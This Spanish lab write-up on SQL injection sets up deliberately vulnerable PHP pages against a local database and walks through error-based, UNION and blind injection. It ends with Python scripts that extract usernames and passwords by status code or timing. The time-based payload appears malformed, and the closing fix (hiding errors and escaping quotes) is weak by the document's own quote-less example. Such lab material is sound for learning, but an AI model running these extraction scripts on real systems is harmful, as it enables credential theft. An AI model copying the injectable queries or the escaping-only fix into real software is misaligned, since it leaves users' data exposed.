---
title: "[Lab] SQL Injection (SQLI)"
date: 2023-12-25
categories: [OWASPTop10]
tags: [owasptop10, hacking, sql, php]
---


# SQL Injection (SQLI)


## Requerimientos

```bash
# Instalación
apt install mariadb-server apache2 php-mysql
service mysql start
service apache2 start

# Creación de base de datos
mysql -uroot -p
create database Hack4u;
create table users(id int(32), username VARCHAR(32), 
password varchar(32));
describe users;
insert into users(id, username, password) 
values(1, 'bryan', 'bryan123');
insert into users(id, username, password) 
values(2, 'admin', '4dm1n00x&%1');
insert into users(id, username, password) 
values(3, 'pedro', 'str0ngP$$w0rd');
# Creación de usuario de mysql
create user 'Administrador'@'localhost' identified by 'password123';
grant all privileges on Hack4u to 'Administrador'@'localhost';
```
Página opcional online para hacer bases de datos: [https://extendsclass.com/mysql-online.html](https://extendsclass.com/mysql-online.html)

## Scripts PHP

### Para error based y UNION Select

```bash
<?php
    $server = "localhost";
    $username = "Administrador";
    $password = "password123";
    $database = "Hack4u";

    // Conexión con la base de datos
    $conn = new mysqli($server, $username, $password, $database);

		// Query a la base de datos
    $id = $_GET['id'];

    $data = mysqli_query($conn, "select username from users where id = '$id'") or die(mysqli_error($conn));

    $response = mysqli_fetch_array($data);

    echo $response['username']
?>
```

**Pruebas**

Probar error based:

![Solicitud por GET para obtener el nombre del usuario con el id 1](../assets/OWASP-TOP-10/SQL Injection (SQLI)/Untitled.png)

Solicitud por GET para obtener el nombre del usuario con el id 1

![Solicitud con una comilla colgante para provocar un error en la base de datos](../assets/OWASP-TOP-10/SQL Injection (SQLI)/Untitled 1.png)

Solicitud con una comilla colgante para provocar un error en la base de datos

Probar UNION Select:

Eje #1

![Untitled](../assets/OWASP-TOP-10/SQL Injection (SQLI)/Untitled 2.png)

![Untitled](../assets/OWASP-TOP-10/SQL Injection (SQLI)/Untitled 3.png)

![Untitled](../assets/OWASP-TOP-10/SQL Injection (SQLI)/Untitled 4.png)

¿Por qué si la tabla tiene tres columnas, muestra un mensaje de error al hacer el “order by 3”?

Esto se debe a que la query como tal está seleccionando un solo parámetro el cual es “username” entonces, aunque la tabla tenga 3 columnas, la query que se está aplicando al hacer el GET, selecciona una sola columna (username).

![Untitled](../assets/OWASP-TOP-10/SQL Injection (SQLI)/Untitled 5.png)

Eje #2

![Prueba #1 union select](../assets/OWASP-TOP-10/SQL Injection (SQLI)/Untitled 6.png)

Prueba #1 union select

![Prueba #2 union select](../assets/OWASP-TOP-10/SQL Injection (SQLI)/Untitled 7.png)

Prueba #2 union select

![Prueba #3 union select](../assets/OWASP-TOP-10/SQL Injection (SQLI)/Untitled 8.png)

Prueba #3 union select

Al hacer el union select, es posible que de no muestre el caractér 1 en este caso como en la primer captura, para solucionar esto, se utiliza un valor de id inválido o no poner id.

![Untitled](../assets/OWASP-TOP-10/SQL Injection (SQLI)/Untitled 9.png)

Eje#3

![Untitled](../assets/OWASP-TOP-10/SQL Injection (SQLI)/Untitled 10.png)

![Untitled](../assets/OWASP-TOP-10/SQL Injection (SQLI)/Untitled 11.png)

Hay veces en las que al querer mostrar todas las bases de datos, no funcione o no muestre todas, para solucionar esto, se puede jugar con “group_concat” o con limit, esto servirá para que en un mismo campo, muestre todos los resultados

Eje #4

![Untitled](../assets/OWASP-TOP-10/SQL Injection (SQLI)/Untitled 12.png)

![Untitled](../assets/OWASP-TOP-10/SQL Injection (SQLI)/Untitled 13.png)

Similar al ejemplo anterior pero jugando con “limit n,m” para ir saltando sobre diferentes líneas donde n corresponde al número de línea. Tanto el ejemplo anterior como este aplica para las tablas, columnas y valores de columnas.

![Untitled](../assets/OWASP-TOP-10/SQL Injection (SQLI)/Untitled 14.png)

![Untitled](../assets/OWASP-TOP-10/SQL Injection (SQLI)/Untitled 15.png)

![Untitled](../assets/OWASP-TOP-10/SQL Injection (SQLI)/Untitled 16.png)

## Para Conditional Response

```bash
<?php
    $server = "localhost";
    $username = "Administrador";
    $password = "password123";
    $database = "Hack4u";

    // Conexión con la base de datos
    $conn = new mysqli($server, $username, $password, $database);

		// Query a la base de datos
    $id = $_GET['id'];

    $data = mysqli_query($conn, "select username from users where id = '$id'");

    $response = mysqli_fetch_array($data);

    echo $response['username']
?>
```

**Pruebas**

Forzar errores:

![Untitled](../assets/OWASP-TOP-10/SQL Injection (SQLI)/Untitled 17.png)

![Untitled](../assets/OWASP-TOP-10/SQL Injection (SQLI)/Untitled 18.png)

¿Por qué al insertar una comilla, no muestra error de la base de datos?

Se debe a que el en el código se eliminó la orden para que mostrara errores (”die(mysqli_error($conn))”), por lo que ahora no se puede identificar, por ejemplo, la cantidad de columnas con base en los errores

Probar UNION Select

Eje #1

![Untitled](../assets/OWASP-TOP-10/SQL Injection (SQLI)/Untitled 19.png)

![Untitled](../assets/OWASP-TOP-10/SQL Injection (SQLI)/Untitled 20.png)

Aunque no aparezcan errores, se debe intentar listar la cantidad de columnas, esto para comprobar si hay algún elemento que aparece o desaparece como en la imagen anterior. Ya para resto de inyecciones para mostrar las bases de datos, columnas, etc, son las mismas en este caso.

### Para inyecciones sin comillas

```bash
<?php

    $server = "localhost";
    $username = "Administrador";
    $password = "password123";
    $database = "Hack4u";

    // Conexión con la base de datos
    $conn = new mysqli($server, $username, $password, $database);

    $id = mysqli_real_escape_string($conn, $_GET['id']);

    echo "[+] Tu valor introducido es: " . $id . "<br>-------------------------------</br>";

    $data = mysqli_query($conn, "select username from users where id = $id");

    $response = mysqli_fetch_array($data);

    echo $response['username']
?>
```

**Pruebas**

Forzar error:

![Untitled](../assets/OWASP-TOP-10/SQL Injection (SQLI)/Untitled 21.png)

![Untitled](../assets/OWASP-TOP-10/SQL Injection (SQLI)/Untitled 22.png)

![Untitled](../assets/OWASP-TOP-10/SQL Injection (SQLI)/Untitled 23.png)

![Untitled](../assets/OWASP-TOP-10/SQL Injection (SQLI)/Untitled 24.png)

Como se puede ver, el introducir una comilla no sirve ya que el código está sanitizado para que las escape, además, en la query no se están usando comillas para “encerrar” el campo “id”, por lo que no provocarán errores ya que no habrán comillas colgadas, aún así esto no evita que se pueda hacer inyecciones SQL, si las comillas son un problema, simplemente se pueden no usar como en la tercer imagen

Probar UNION Select

Eje #1

![Untitled](../assets/OWASP-TOP-10/SQL Injection (SQLI)/Untitled 25.png)

## Para Conditional Errors

```bash
<?php

    $server = "localhost";
    $username = "Administrador";
    $password = "password123";
    $database = "Hack4u";

    // Conexión con la base de datos
    $conn = new mysqli($server, $username, $password, $database);

    $id = mysqli_real_escape_string($conn, $_GET['id']);

    $data = mysqli_query($conn, "select username from users where id = $id");

    $response = mysqli_fetch_array($data);

    if(!isset($response['username'])){
			http_response_code(404);
		}
?>
```

**Pruebas**

Forzar error:

![Untitled](../assets/OWASP-TOP-10/SQL Injection (SQLI)/Untitled 26.png)

![Untitled](../assets/OWASP-TOP-10/SQL Injection (SQLI)/Untitled 27.png)

![Untitled](../assets/OWASP-TOP-10/SQL Injection (SQLI)/Untitled 28.png)

Como se puede ver, hay veces en las que las inyecciones son a ciegas ya que en la web visualmente no se muestra nada, pero sí cambia el código de estado, con base en esto se abre una vía potencial para descubrir información de la base de datos. Cuando se enfrenta a este tipo de escenarios a ciegas, se juega con condiciones o con el tiempo.

**Formas de evadir el escape de comillas:**

Si se tiene la siguiente query:

```bash
# Esto da como resultado: b
select(select(substring(username,1,1)) from users where id=1);

# Esto hace una comparación: ¿'b' = 'b'? -> 1
select(select(substring(username,1,1)) from users where id=1)='b';
```

Esta query básicamente está tomando el primer caractér del usuario el cual tiene como id 1 y lo compara con “b”, en caso de que esto sea cierto, daría como resultado 1 y en el caso contrario sería 0.

El problema es que cuando el código está sanitizado para que se escapen las comillas, esta query no servirá por lo que se deben usar otras formas para evadir esta restricción.

Una forma para evadir esto es utilizando decimales, en lugar de usa “b”, se usaría en su forma decimal:

```bash
# Da como resultado 98 el cual corresponde a "b" en decimal
select(select ascii(substring(username,1,1)) from users where id=1);
```

![Untitled](../assets/OWASP-TOP-10/SQL Injection (SQLI)/Untitled 29.png)

De forma que ahora se puede modificar la query para que en lugar de usar comillas para encerrar un string, se usan números decimales los cuales no necesitan de comillas:

```bash
# Esto hace una comparación: ¿98 = 98? -> 1
select(select ascii(substring(username,1,1)) from users where id=1)=98;
```

Ejemplos de lo hablado anteriormente:

![Prueba básica de forzado de “404 Not Found” y “200 OK”](../assets/OWASP-TOP-10/SQL Injection (SQLI)/Untitled 30.png)

Prueba básica de forzado de “404 Not Found” y “200 OK”

![Prueba de petición con decimales y sin decimales con comillas.](../assets/OWASP-TOP-10/SQL Injection (SQLI)/Untitled 31.png)

Prueba de petición con decimales y sin decimales con comillas.

*El parámetro **`-G --data-urlencode`** sirve para tramitar peticiones por GET de forma “urlconded”, sin esto, se tendría que urlencodear la petición manualmente.*

**Script en Python**

Sabiendo esto, se podría crear un script en python para automatiza el proceso:

```bash
# Instalar pwn tools
pip3 install pwn
```

- Script para fuzzear usuarios y contraseñas basado en el código de estado
    
    ```bash
    #!/usr/bin/python3
    
    import requests
    import signal
    import sys
    import time
    from pwn import *
    
    def def_handler(sig, frame):
    	print("\n\n[!] Exiting...\n")
    	sys.exit(1)
    
    # cltr_c
    signal.signal(signal.SIGINT, def_handler)
    
    # Variables de entorno
    main_url = "http://localhost/users.php"
    
    def makeSQLI():
    
    	p1 = log.progress("Fuerza bruta")
    	p1.status("Iniciando fuerza bruta...")
    
    	time.sleep(2)
    
    	p2 = log.progress("Datos extraÃ­dos")
    
    	extracted_info = ""
    
    	for position in range(1, 150):
    		for character in range(33, 126):
    			sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(username,0x3a,password) from users),%d,1)) from users where id=1)=%d)" % (position, character)
    
    			p1.status(sqli_url)
    
    			r = requests.get(sqli_url)
    
    			if r.status_code == 200:
    				extracted_info += chr(character)
    				p2.status(extracted_info)
    				break
    
    if __name__ == '__main__':
    
    	makeSQLI()
    ```
    
- Script para fuzzear usuarios y contraseñas basado en el tiempo
    
    ```bash
    #!/usr/bin/python3
    
    import requests
    import signal
    import sys
    import time
    from pwn import *
    
    def def_handler(sig, frame):
    	print("\n\n[!] Exiting...\n")
    	sys.exit(1)
    
    # cltr_c
    signal.signal(signal.SIGINT, def_handler)
    
    # Variables de entorno
    main_url = "http://localhost/users.php"
    
    def makeSQLI():
    
    	p1 = log.progress("Fuerza bruta")
    	p1.status("Iniciando fuerza bruta...")
    
    	time.sleep(2)
    
    	p2 = log.progress("Datos extraÃ­dos")
    
    	extracted_info = ""
    
    	for position in range(1, 150):
    		for character in range(33, 126):
    			sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(username,0x3a,password) from users),%d,1))=%d,sleep(0,35),1)" % (position, character)
    
    			p1.status(sqli_url)
    
    			time_start = time.time()
    
    			r = requests.get(sqli_url)
    
    			time_end = time.time()
    
    			if time_end - time_start > 0.35:
    				extracted_info += chr(character)
    				p2.status(extracted_info)
    				break
    
    if __name__ == '__main__':
    
    	makeSQLI()
    ```
    

## Sanitizaciones

No mostrar errores con die(mysqli_error($conn))

Modificar la variable que obtiene el valor que el usuario inserta por GET para que sea como lo siguiente, Lo que hará es escapar las comillas: mysqli_real_scape_string($conn, $_GET[’id’]);

![Código sin escapado de caracteres](../assets/OWASP-TOP-10/SQL Injection (SQLI)/Untitled 32.png)

Código sin escapado de caracteres

![Código con escapado de caracteres](../assets/OWASP-TOP-10/SQL Injection (SQLI)/Untitled 33.png)

Código con escapado de caracteres
